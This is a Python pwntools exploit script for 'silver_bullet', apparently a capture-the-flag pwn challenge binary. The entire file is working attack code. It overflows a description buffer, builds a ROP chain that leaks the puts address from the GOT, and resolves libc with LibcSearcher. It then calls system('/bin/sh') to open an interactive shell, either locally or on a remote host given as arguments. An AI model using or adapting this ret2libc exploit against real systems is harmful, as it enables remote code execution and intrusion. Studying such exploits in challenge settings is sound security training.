import sys
from pwn import *
from LibcSearcher import *

context(arch="i386", os="linux", log_level="debug")
elf = ELF("./silver_bullet")
if len(sys.argv) == 3:
    io = remote(sys.argv[1], sys.argv[2])
else:
    io = process("./silver_bullet")

def op(i):
    io.recvuntil("Your choice :")
    io.sendline(str(i))

def create(desc):
    op(1)
    io.recvuntil("Give me your description of bullet :")
    io.sendline(desc)

def powerup(desc):
    op(2)
    io.recvuntil("Give me your another description of bullet :")
    io.sendline(desc)

def beat():
    op(3)

# g = lambda x : next(elf.search(asm(x)))
popret = 0x08048475
create("a" * 47)
powerup("a")
# gdb.attach(io, "b *0x8048984")
powerup("a"*3 + p32(0xdeadbeef) + p32(elf.plt["puts"]) + p32(popret) + p32(elf.got["puts"]) + p32(elf.symbols["main"]) + "a" * 24) 
beat()
beat()
io.recvuntil("Oh ! You win !!\n")
puts_addr = u32(io.recv(4))

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

create("a" * 47)
powerup("a")
powerup("a" * 3 + p32(0xdeadbeef) + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + "a" * 28)
beat()
beat()

io.interactive()